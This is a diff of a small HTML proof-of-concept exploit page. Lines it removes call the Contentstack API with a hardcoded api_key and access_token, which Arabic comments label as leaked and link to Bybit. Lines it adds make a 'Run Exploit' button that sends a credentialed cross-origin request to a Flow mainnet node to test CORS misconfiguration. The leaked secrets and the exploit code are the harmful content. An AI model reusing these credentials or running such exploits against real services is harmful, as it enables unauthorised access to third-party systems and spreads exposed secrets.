@@ -2,32 +2,30 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Bybit API Key Exposure PoC</title>
+  <title>CORS PoC - Flow Node Mainnet</title>
 </head>
 <body>
-  <h2>Bybit API Key Exposure PoC</h2>
-  <pre id="output">Loading...</pre>
+  <h2>CORS Misconfiguration PoC</h2>
+  <button onclick="exploit()">Run Exploit</button>
+  <pre id="output"></pre>
 
   <script>
-    async function testAPI() {
+    async function exploit() {
       try {
-        const res = await fetch("https://cdn.contentstack.io/v3/content_types?environment=production", {
+        const response = await fetch("https://access.mainnet.nodes.flow.com/v1/blocks?start_height=88226270&end_height=88226275", {
           method: "GET",
+          credentials: "include", // <== مهم جداً
           headers: {
-            "api_key": "blt8ec5b78e9ea1d11d",   // المفتاح المسرب
-            "access_token": "csc62ab090cedcfd9c7c8bb015", // التوكن المسرب
             "Content-Type": "application/json"
           }
         });
 
-        const data = await res.json();
-        document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+        const data = await response.text();
+        document.getElementById("output").textContent = data;
       } catch (err) {
         document.getElementById("output").textContent = "Error: " + err;
       }
     }
-
-    testAPI();
   </script>
 </body>
 </html>
